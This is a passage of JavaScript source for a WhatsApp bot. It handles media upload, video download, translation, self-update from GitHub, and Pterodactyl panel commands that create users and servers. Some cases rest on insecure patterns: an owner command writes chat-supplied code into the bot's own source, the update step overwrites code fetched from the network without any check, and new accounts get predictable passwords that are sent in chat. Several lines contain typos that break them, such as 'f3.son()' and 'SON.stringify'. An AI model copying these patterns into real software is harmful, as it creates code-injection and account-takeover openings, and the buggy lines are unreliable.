            responseUrl = await uploadToCatbox(media);
        } else {
            // Upload other media to file.io
            responseUrl = await uploadToFileIo(media);
        }

        if (!responseUrl) throw new Error("Failed to upload file");

        // Send the URL to the user
        m.reply(util.format(responseUrl));

        // Remove the media from storage after upload
        await fs.promises.unlink(media);
    } catch (error) {
        console.error('Error during the URL upload process:', error.message);
        replyCsuit('An error occurred while uploading the file. Please try again.');
    }
}
break

case 'fbvideo':
    if (args.length == 0) {
        return replyCsuit(`Example: ${prefix + command} https://www.facebook.com/share/v/15fNp5gHK4/`);
    }

    await loading();

    axios.get(`https://api.davidcyriltech.my.id/facebook?url=${args[0]}`)
        .then(({ data }) => {
            if (!data.result) {
                return replyCsuit("Failed to retrieve video. Please check the URL and try again.");
            }

            LostBoyTechInc.sendMessage(from, { 
                video: { url: data.result }, 
                mimetype: 'video/mp4', 
                caption: "Silahkan ketik *tovn* atau *toaudio* untuk mengubahnya menjadi audio/VN." 
            });
        })
        .catch(error => {
            console.error("Error fetching Facebook video:", error);
            replyCsuit("An error occurred while fetching the Facebook video.");
        });
    break;

			case 'translate': {
    const langAbbreviation = args[0]; // Get the language abbreviation from the arguments
    const textToTranslate = m.quoted?.text || args.slice(1).join(' '); // Check if replying to a message or taking input

    // Check if language abbreviation is provided
    if (!langAbbreviation || !textToTranslate) {
        return replyCsuit(`\`what should i translate\`\n*𝔼𝕩𝕒𝕞𝕡𝕝𝕖: ${prefix + command} en Hola
        > ALWAYS BRING "EN" BEFORE WORD`);
    }

    try {
        await loading();

        // API call
        const apiUrl = `https://api.popcat.xyz/translate?to=${langAbbreviation}&text=${encodeURIComponent(textToTranslate)}`;
        const response = await fetch(apiUrl);
        const json = await response.json();

        // Log the API response to the console
        console.log("Translation Response:", json);

        
// Validate API response
if (!json.translated) {
    return replyCsuit("Failed🙃.");
}

// Send the translated text
replyCsuit(`*Translated text:*\n\n\`\`\`${json.translated}\`\`\``);


    } catch (error) {
        console.error("Error in translate case:", error);
        replyCsuit("Error occured😑.");
    }
    break;
}
	//update
case 'update': {
    if (!isCreator) return ownernya(); // Check if the user has the right permission
    const repoOwner = 'LOSTBOY1-TCH'; // Replace with your GitHub username
    const repoName = 'C_Suit_V3'; // Replace with your repository name
    const branch = 'main';           // Replace with your branch name if different
    const localDir = './';  // Directory to save downloaded files

    // Create local directory if it doesn't exist
    if (!fs.existsSync(localDir)){
        fs.mkdirSync(localDir);
    }

    // Function to download a file from GitHub
    async function downloadFile(filePath) {
        const rawUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/${branch}/${filePath}`;
        
        try {
            replyCsuit(`Downloading: ${filePath}`); // Inform user about the download process
            const response = await fetch(rawUrl);
            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
            
            const data = await response.text();
            const localFilePath = path.join(localDir, filePath);

            // Ensure the directory exists for nested paths
            fs.mkdirSync(path.dirname(localFilePath), { recursive: true });

            // Save the file locally
            fs.writeFileSync(localFilePath, data, 'utf8');
            replyCsuit(`Successfully updated: ${filePath}`); // Inform user about the success
        } catch (error) {
            replyCsuit(`Error downloading file: ${filePath} - ${error.message}`);
            replyCsuit('C SUIT V3 Auto Update Failed\nPlease Type .repo and Sync Fork and redeploy the Latest Version!');
        }
    }

    // Example list of files to download
    const filesToDownload = [
        'C-Suit-v3.js' // Replace with actual file paths in your repo
    ];

    // Start the update process and notify the user
    replyCsuit('Starting update process...');

    // Download each file
    Promise.all(filesToDownload.map(file => downloadFile(file)))
        .then(() => {
            replyCsuit('C SUIT V3 Has Automatically Updated To Latest Version');
        })
        .catch(() => {
            replyCsuit('Some files failed to update.');
        });

    break;	
}
//new 
 case 'git': case 'gitclone': {
if (!args[0]) return replyCsuit(`Where is the link?\nExample :\n${prefix ? prefix : '.'}${command} https://github.com/LOSTBOY1-TCH/C_Suit_V3 `)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replyCsuit(`Link invalid!!`)
await replyCsuit(mess.wait)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
LostBoyTechInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replyCsuit(err))
}   
break
case 'addcase': {
    if (!isCreator) return replyCsuit(mess.only.owner)
    if (!text) return replyCsuit('Wheres the case?');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = 'C-Suit-v3.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('An error occurred while reading the file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                replyCsuit('An error occurred while writing the file:', err);
            } else {
                replyCsuit('New case successfully added above gimage case.');
            }
        });
    } else {
        replyCsuit('Cannot find gimage case in files.');
    }
});

}
break;
case 'getcase':
if (!isCreator) return replyCsuit(mess.only.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("C-Suit-v3").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replyCsuit(`${getCase(isCreator)}`)
break
//panel cmds
case "listusr": {
  if (!isCreator) return replyCsuit('Specially for Lostboy')
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "list of users:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await LostBoyTechInc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    replyCsuit(`Use the command  ${prefix}listusr ${res.meta.pagination.current_page + 1} to lidt servers.`);
  }
}
break;
case "listsrv": {
  if (!isCreator) return replyCsuit(`You ain't Lostboy.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "List of all servers:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Page : ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await LostBoyTechInc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    replyCsuit(`Use the ${prefix}listsrv ${res.meta.pagination.current_page + 1} to view the next page.`);
  }        
}
break;
case "delsrv": {
      if (!isCreator) return replyCsuit(`Specially for lostboy `)

let srv = args[0]
if (!srv) return replyCsuit('Where is his id?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return replyCsuit('*SERVER NOT FOUND*')
replyCsuit('*SUCCESSFULLY DELETED THE SERVER*')
}
        break
case "addusr": {

if (!isCreator) return replyCsuit(`Sorry this command is soecially for bit developers `)
let t = text.split(',');
if (t.length < 3) return replyCsuit(`*Wrong format*

Example:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return replyCsuit(`*Wrong Format!*

Example:
${prefix + command} email,username,name,number/tag`);
let d = (await LostBoyTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return replyCsuit(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await LostBoyTechInc.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD SUCCESSFULLY SENT TO @${u.split`@`[0]}*`, mentions:[u],
})
LostBoyTechInc.sendMessage(u, { text: `*HERE ARE YOUR DETAILS OF YOUR PANEL ACCOUNT*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})        
}
break
case "1gb": {
    if (!isPremium && !isCreator) return replyCsuit('Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner')

let t = text.split(',');
if (t.length < 2) return replyCsuit(`*Wrong Format!*
Example:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/sc7oci.jpg" 
if (!u) return
let d = (await LostBoyTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyCsuit(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyCsuit(`DONE BY LOSTBOY
 *DONE CREATE USER + SERVER ID :* ${user.id}`)
ctf = `hi @${u.split`@`[0]}

 *Username* : ${user.username}
 *Password* : ${password}
 *Login* : ${domain}

_*NOTE :*_
_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_
 > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS

_*YouTube: youtube.com/@lostboy-tch*_

_*Telegram: t.me/lostboytech12*_
`
LostBoyTechInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: LostBoyTechInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodes_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.son()
if (res.errors) return replyCsuit(SON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyCsuit(`
DONE GUY, THE DATA HAS BEEN SENT TO THE NUMBER ANAY... © LOSTBOY
`)        
} 
break
case "2gb": {
if (!isPremium && !isCreator) return replyCsuit('Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner')

let t = text.split(',');
if (t.length < 2) return replyCsuit(`*Wrong Format!*
Example:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/sc7oci.jpg" 
if (!u) return
let d = (await LostBoyTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyCsuit(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyCsuit(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `hi @${u.split`@`[0]}

*Username* : ${user.username}
*Password* : ${password}
*Login* : ${domain}

_*NOTE :*_
_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_
 > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS

_*YouTube: youtube.com/@lostboy-tch*_

_*Telegram: t.me/lostboytech12*_
`
LostBoyTechInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: LostBoyTechInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyCsuit(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyCsuit(`
*SUCCESSFULLY ADDED USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)        
}  
break
case "3gb": {
if (!isPremium && !isCreator) return replyCsuit('Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner')

let t = text.split(',');
if (t.length < 2) return replyCsuit(`*Wrong Format!*
Example:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/sc7oci.jpg" 
if (!u) return
let d = (await LostBoyTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyCsuit(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyCsuit(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `hi @${u.split`@`[0]}

*Username* : ${user.username}
*Password* : ${password}
*Login* : ${domain}

_*NOTE :*_
_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_
 > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS

_*YouTube: youtube.com/@lostboy-tch*_

_*Telegram: t.me/lostboytech12*_
`
LostBoyTechInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: LostBoyTechInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyCsuit(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyCsuit(`
*SUCCESSFULLY ADDED USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)        
}
break
case "5gb": {
if (!isPremium && !isCreator) return replyCsuit('Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner')

let t = text.split(',');
if (t.length < 2) return replyCsuit(`*Wrong Format!*
Example:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/sc7oci.jpg" 
if (!u) return
let d = (await LostBoyTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyCsuit(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyCsuit(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `hi @${u.split`@`[0]}

*Username* : ${user.username}
*Password* : ${password}
*Login* : ${domain}

_*NOTE :*_
_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_
 > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS

_*YouTube: youtube.com/@lostboy-tch*_

_*Telegram: t.me/lostboytech12*_
`
LostBoyTechInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: LostBoyTechInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyCsuit(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyCsuit(`
*SUCCESSFULLY ADDED USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)        
}        
break
case "4gb": {
    if (!isPremium && !isCreator) return replyCsuit('Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner')

let t = text.split(',');
if (t.length < 2) return replyCsuit(`*Wrong Format!*
Example:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/sc7oci.jpg" 
if (!u) return
let d = (await LostBoyTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyCsuit(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyCsuit(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `hi @${u.split`@`[0]}

*Username* : ${user.username}
*Password* : ${password}
*Login* : ${domain}

_*NOTE :*_
_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_
 > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS

_*YouTube: youtube.com/@lostboy-tch*_

_*Telegram: t.me/lostboytech12*_
`
LostBoyTechInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: LostBoyTechInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyCsuit(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyCsuit(`
*SUCCESSFULLY ADDED USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)        
}  
break
case "6gb": {
    if (!isPremium && !isCreator) return replyCsuit('Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner')

let t = text.split(',');
if (t.length < 2) return replyCsuit(`*Wrong Format!*
Example:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "6148"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/sc7oci.jpg" 
if (!u) return
let d = (await LostBoyTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return replyCsuit(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
replyCsuit(`SUCCESSFULLY CREATED USER ID: ${user.id}`)
ctf = `Hi @${u.split`@`[0]}

*Username* : ${user.username}
*Password* : ${password}
*Login* : ${domain}

_*NOTE :*_
_OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE. PLEASE KEEP IT PROPERLY IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN_
 > DONT SHARE PANEL LINK TO PROTECT YOURSELF FROM DDOS
_*YouTube: youtube.com/@lostboy-tch*_

_*Telegram: t.me/lostboytech12*_
`
LostBoyTechInc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: LostBoyTechInc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return replyCsuit(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await replyCsuit(`
*SUCCESSFULLY ADDED USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)        
}  
break
case "7gb": {
    if (!isPremium && !isCreator) return replyCsuit('Sorry, you are not a premium user yet. To become a premium user, please buy from the owner by typing .owner ')

let t = text.split(',');
if (t.length < 2) return replyCsuit(`*Wrong format!*
Example:
${prefix + command} user,number`)
let username = t[0];
